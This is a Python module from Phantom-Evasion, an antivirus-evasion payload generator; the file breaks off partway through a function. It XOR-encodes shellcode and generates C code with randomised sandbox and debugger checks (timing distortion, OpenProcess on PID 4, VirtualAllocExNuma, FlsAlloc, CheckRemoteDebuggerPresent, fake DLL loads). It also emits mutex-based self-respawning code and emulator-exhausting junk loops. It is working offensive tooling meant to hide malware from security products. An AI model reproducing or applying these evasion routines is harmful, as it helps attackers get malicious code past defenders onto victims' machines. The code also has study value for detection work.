
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import random, string
import sys
import platform 
sys.path.append("Modules/payloads/encryption")
import Multibyte_xor
import Multibyte_xorPy3
sys.dont_write_bytecode = True

def encoding_manager(Encryption,Payload,Randbufname):

    if Encryption == "1":

        Payload = Payload.replace("buf",Randbufname)

        return Payload

    if (Encryption == "2") or (Encryption == "3") or (Encryption == "4"):

        Payload = Payload.splitlines()
        Shellcode = ""
        for line in Payload:
            line=line.replace("unsigned char buf[]","")
            line=line.replace(" ","")
            line=line.replace("=","")
            line=line.replace('"','')
            line=line.replace('\n','')
            line=line.replace(';','')
            Shellcode += line

        py_version=platform.python_version()
        if py_version[0] == "3":

            if Encryption == "2":

                Payload = Multibyte_xorPy3.Xor_stub3(Shellcode,Randbufname)

                return Payload

            if Encryption == "3": 

                Payload = Multibyte_xorPy3.Doublexor_stub3(Shellcode,Randbufname) 
 
                return Payload

            if Encryption == "4": 

                Payload = Multibyte_xorPy3.Triplexor_stub3(Shellcode,Randbufname) 
 
                return Payload

        else:

            if Encryption == "2":

                Payload = Multibyte_xor.Xor_stub2(Shellcode,Randbufname)

                return Payload

            if Encryption == "3": 

                Payload = Multibyte_xor.Doublexor_stub2(Shellcode,Randbufname) 
 
                return Payload

            if Encryption == "4": 

                Payload = Multibyte_xor.Triplexor_stub2(Shellcode,Randbufname) 
 
                return Payload



def powershell_adjust(powershell_var):
    ret_powershell=""
    powershell_var=powershell_var.splitlines()
    for line in powershell_var:
        if line != "\n" and line != "":
            line= '"' + line.replace('"','\\"') + '\\n"\n'
            ret_powershell += line
    return ret_powershell

def windows_evasion():
    Evasion_code = ""
    number = random.randint(1,14)

    if number == 1:    # open process trick
        Randfilehandle = varname_creator()
        Randprochandle = varname_creator()
        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += Randprochandle + " = OpenProcess( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == 2:  # check time distortion 1
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "Sleep(" + Randsleep + ");\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 3:  # Create file Set attribute_hidden and remove it 
        Randvarname = varname_creator()
        junk = varname_creator()
        Randfileptr = varname_creator()
        Randfilename = varname_creator()
        Randattr = varname_creator()        
        Evasion_code += "char " + Randvarname + "[] = " + "\"" + junk + "\";\n" 
        Evasion_code += "FILE *" + Randfileptr + " = fopen(\"" + Randfilename + "\",\"w\");\n"
        Evasion_code += "fputs(" + Randvarname + "," + Randfileptr + ");\n"
        Evasion_code += "fclose(" + Randfileptr + ");\n"
        Evasion_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randfilename + "\");\n"
        Evasion_code += "SetFileAttributes(\"" + Randfilename + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
        Evasion_code += "if ((" + Randfileptr + " = fopen(\"" + Randfilename + "\", \"r\"))){\n"
        Evasion_code += "fclose(" + Randfileptr + ");\n"
        Evasion_code += "remove(\"" + Randfilename + "\");\n"


    elif number == 4: # dynamic big mem alloc then zero-out
        Ndcvirtual = varname_creator()
        Randptr = varname_creator()
        Randbytesnumb = str(random.randrange(10000000,90000000,1024))
        
        Evasion_code += "LPVOID " + Randptr + " = NULL ;\n"
        Evasion_code += "FARPROC " + Ndcvirtual + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAlloc\");\n"
        Evasion_code += Randptr + " = (LPVOID)" + Ndcvirtual + "(NULL," + Randbytesnumb + ",0x3000,0x40);\n"
        Evasion_code += "if(" + Randptr + "!= NULL){\n"
        Evasion_code += "SecureZeroMemory(" + Randptr + "," + Randbytesnumb + ");\n"
        Evasion_code += "VirtualFree(" + Randptr + ", 0 , 0x8000);\n"


    elif number == 5: # load fake dll

        Ker32 = varname_creator()
        Fakedllname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(12,16)))
        
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(TEXT(\"" + Fakedllname + ".dll\"));\n"
        Evasion_code += "if(" + Ker32 + " == NULL){\n"


    elif number == 6: # SetErrorMode trick

        dwCode = varname_creator()
        error_numb = str(random.randint(1000,2000))
        
        Evasion_code += "DWORD " + dwCode + ";\n"
        Evasion_code += "SetErrorMode(" + error_numb + ");\n"
        Evasion_code += "if(SetErrorMode(0) == " + error_numb + "){SetErrorMode(0);\n"

    if number == 7: # dynamic open process trick
        dyn_loadOP = varname_creator()
        Randprochandle = varname_creator()

        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += "FARPROC " + dyn_loadOP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"OpenProcess\");\n"
        Evasion_code += Randprochandle + " = (HANDLE)" + dyn_loadOP + "( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == 8: # dynamic WTF is numa?
        dyn_loadVAEX = varname_creator()
        memvar = varname_creator()
        
        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"


    elif number == 9: # dynamic WTF is fls?
        dyn_loadFLSA = varname_creator()
        resvar = varname_creator()
        

        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"FlsAlloc\");\n"
        Evasion_code += "DWORD " + resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"
 

    elif number == 10: # Dynamic CheckRemoteDebuggerPresent

        dyn_loadCRDP = varname_creator()
        Randbool = varname_creator()
        Evasion_code += "BOOL " + Randbool + " = FALSE;\n"
        Evasion_code += "FARPROC " + dyn_loadCRDP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CheckRemoteDebuggerPresent\");\n"
        Evasion_code += dyn_loadCRDP + "(GetCurrentProcess(), &" + Randbool + ");\n"
        Evasion_code += "if(" + Randbool + " != TRUE){\n"

    elif number == 11: # Dynamic2 WTF is numa?
        dyn_loadVAEX = varname_creator()
        Ker32 = varname_creator()
        memvar = varname_creator()
        
        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(" + Ker32 + ", \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);}\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"

    elif number == 12: # dyn check time distortion 2 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        Rand_delayms = varname_creator()
        dyn_loadGTC = varname_creator()
        dyn_loadSE = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadSE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"SleepEx\");\n" 
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += dyn_loadSE + "(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 13: # dynamic2 WTF is fls?
        dyn_loadFLSA = varname_creator()
        Ker32 = varname_creator()
        resvar = varname_creator()
        
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "DWORD " + resvar + ";\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(" + Ker32 + ", \"FlsAlloc\");\n"
        Evasion_code += resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);}\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"


    elif number == 14: # dyn check time distortion 1 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Rand_delayms = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "SleepEx(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    return Evasion_code



def spawn_multiple_process(number):

    Evasion_code = ""
    for line in range(0,number):
        number = random.randint(1,3)

        if number == 1: # CreateMutex/WinExec 1

            mutexvar = varname_creator()
            mutexname = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "WinExec(argv[0],0);Sleep(" + Randtime + ");}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"


        elif number == 2: # CreateMutex/WinExec 2

            mutexvar = varname_creator()
            mutexname = varname_creator()
            dyn_loadWE = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "FARPROC " + dyn_loadWE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WinExec\");\n" 
            Evasion_code += dyn_loadWE + "(argv[0],0);Sleep(" + Randtime + ");}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"


        elif number == 3: # CreateMutex/CreateProcess 1
            Mutexvar = varname_creator()
            Mutexname = varname_creator()
            Randsi = varname_creator()
            Randpi = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + Mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + Mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "STARTUPINFO " + Randsi + ";PROCESS_INFORMATION " + Randpi + ";\n"
            Evasion_code += "ZeroMemory(&" + Randsi + ", sizeof(" + Randsi + "));\n"
            Evasion_code += "ZeroMemory(&" + Randpi + ", sizeof(" + Randpi + "));\n"
            Evasion_code += "CreateProcess(argv[0],NULL,NULL,NULL,FALSE,0,NULL,NULL,&" + Randsi + ",&" + Randpi + ");SleepEx(" + Randtime + ",FALSE);}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"

    

    return Evasion_code

def CheckForBackslash(string2check):
    return string2check.replace("\\","\\\\")

def close_brackets_multiproc(number):
    brack= "}" * number
    return brack


def windows_junkcode(number):
    Winjunk_code = ""

    if number == "1":

        msgtype= MBtype()

        Winjunk_code += "MessageBox(NULL,\"Failed\",NULL," + msgtype + ");\n"

    if number == "2":
        User32 = varname_creator()
        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "HINSTANCE " + User32 + " = LoadLibrary(\"User32.dll\");\n"
        Winjunk_code += "if(" + User32 + " != NULL){\n"
        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(" + User32 + ", \"MessageBox\");\n"
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");}\n"

    if number == "3":

        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(GetModuleHandle(\"User32.dll\"), \"MessageBox\");\n" 
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");\n"

    return Winjunk_code


def MBtype():
    msgtype=""
    msgrandomtype = random.randint(1,3)
    if msgrandomtype == 1:
        msgtype="MB_ABORTRETRYIGNORE"
    if msgrandomtype == 2:
        msgtype="MB_CANCELTRYCONTINUE"
    if msgrandomtype == 3:
        msgtype="MB_OKCANCEL"  
    return msgtype

def python_poly_multipath(number,step):
    num_space = ""
    if step == 1:
        num_space=""
    elif step == 2:
        num_space="    "
    elif step == 3:
        num_space="        "
    elif step == 4:
        num_space="            "
    
    if number == 1:    #Long Counter
        Randcounter = varname_creator()
        Randbig = str(random.randint(100000000,220000000))  
        Hollow_code = ""
        Hollow_code += num_space + Randcounter + " = 0\n"
        Hollow_code += num_space + "while " + Randcounter + " < " + Randbig + ":\n"
        Hollow_code += num_space + "    " + Randcounter + " += 1\n"
        Hollow_code += num_space + "if " + Randcounter + " == " + Randbig + ":\n"
        return Hollow_code 

    elif number == 2:   #BacktoZero

        Randbig1 = str(random.randrange(100000000,220000000,100))
        Randcpt = varname_creator()
        Hollow_code = ""
        Hollow_code += num_space + Randcpt + "  = " + Randbig1 + "\n"
        Hollow_code += num_space + "while  " + Randcpt + " > 0 :\n"
        Hollow_code += num_space + "    " + Randcpt + " = " + Randcpt + " - 1\n"
        Hollow_code += num_space + "if " + Randcpt + " == 0 :\n"
        return Hollow_code 

    elif number == 3: # crazy pow 

        Randvar = varname_creator()
        Randfloat = random.uniform(1.110,1.119)
        Randint = random.randint(100,300)
        Randpow = Randfloat**Randint
        Randpow = str(Randpow)  
        Hollow_code = ""
        Hollow_code += num_space + Randvar + " = " + Randpow + "\n"
        Hollow_code += num_space + "while " + Randvar + " > 1:\n"
        Hollow_code += num_space + "    " + Randvar + " = " + Randvar + "/" + str(Randfloat) + "\n"
        Hollow_code += num_space + "if " + Randvar + " <= 1:\n" 
        return Hollow_code



def Junkmathinject():

    number = random.randint(1,28)

    if number == 1: #sum firs n integer 1 
        Randcounter = varname_creator()
        Randcounter2 = varname_creator()
        Randcounter3 = varname_creator()
        Randbignumb = str(random.randint(700000000,900000000))
        Junkcode = ""
        Junkcode += "int " + Randcounter + "," + Randcounter2 + ";\n"
        Junkcode += "unsigned long long int " + Randcounter3 + " = 0;\n"
        Junkcode += Randcounter2 + " = " + Randbignumb + ";\n"
        Junkcode += "for (" + Randcounter + " = 1;" + Randcounter + " <= " + Randcounter2 + "; " + Randcounter + "++){\n"
        Junkcode += Randcounter3 + " = " + Randcounter3 + "+" + Randcounter + ";}\n"

    if number == 2: #sum firs n integer 2 
        Randcounter = varname_creator()
        Randcounter2 = varname_creator()
        Randcounter3 = varname_creator()
        Randbignumb = str(random.randint(700000000,900000000))
        Junkcode = ""
        Junkcode += "int " + Randcounter + ";\n"
        Junkcode += "unsigned long long int " + Randcounter2 + " = 0;\n"
        Junkcode += Randcounter + " = " + Randbignumb + ";\n"
        Junkcode += "while(" + Randcounter + " > 0){\n"
        Junkcode += Randcounter2 + " = " + Randcounter2 + "+" + Randcounter + ";\n"
        Junkcode += Randcounter + " = " + Randcounter + " - 1;}\n"


    elif number == 3: #fibonacci numbers in range (1,N) MEDIO-VELOCE

        Rand1=varname_creator()
        Rand2=varname_creator()
        Rand3=varname_creator()
        Rand4=varname_creator()
        Rand5=varname_creator()
        Randbignumb = str(random.randint(700000000,900000000))

        Junkcode = ""
        Junkcode += "int " + Rand1 + " = 0," + Rand2 + " = 1," + Rand3 + "," + Rand4 + "," + Rand5 + " = 0;\n"
        Junkcode += Rand4 + " = " + Randbignumb + ";\n"
        Junkcode += "while (" + Rand5 + " < " + Rand4 + "){\n"
        Junkcode += Rand3 + " = " + Rand1 + " + " + Rand2 + ";\n" + Rand5 + "++;\n"
        Junkcode += Rand1 + "=" + Rand2 + ";\n" + Rand2 + " = " + Rand3 + ";}\n"
 

    elif number == 4: # Twin tower MEDIO-LENTO

        Randbig1 = str(random.randrange(700000000,990000000,10))
        Randbig2 = str(random.randrange(500000000,790000000,10))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig2 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt2 + "){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}}\n"

    elif number == 5: #BacktoZero MEDIO

        Randbig1 = str(random.randrange(1000000000,2000000000,100))
        Randcpt= varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"


    elif number == 6: # Randmatrix 1 MEDIO-VELOCE

        Randi = str(random.randint(8000,10000))
        Randj = str(random.randint(8000,10000))
        Randmatr= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randtot + " = " + Randtot + " + " + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");\n"

    elif number == 7: # Randmatrix 2 MEDIO-VELOCE

        Randi = str(random.randint(8000,10000))
        Randj = str(random.randint(8000,10000))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] +" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"

    elif number == 8: # Randmatrix 3 MEDIO-VELOCE

        Randi = str(random.randint(8000,10000))
        Randj = str(random.randint(8000,10000))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 2000;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 2000;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] - " + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"


    elif number == 9: # Randmatrix 4 MEDIO-VELOCE

        Randi = str(random.randint(8000,10000))
        Randj = str(random.randint(8000,10000))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 1000;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 1000;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] *" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"



    elif number == 10: # Randmatrix 5 VELOCE

        Randi = str(random.randint(8000,10000))
        Randj = str(random.randint(8000,10000))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] /" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"


    elif number == 11: # Randmatrix 6 VELOCE

        Randi = str(random.randint(6000,9000))
        Randj = str(random.randint(6000,9000))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 500;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 500;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = sqrt(" + Randmatr + "[" + Randflag + "][" + Randflag2 + "] /" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "]);\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"



    elif number == 12: # pow counter 

        Randsmall = str(random.uniform(1.000001000,1.000003000))
        Randsmall2 = str(random.uniform(1.000001000,1.000003000))
        Randbig = str(random.randrange(1000000000,2000000000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
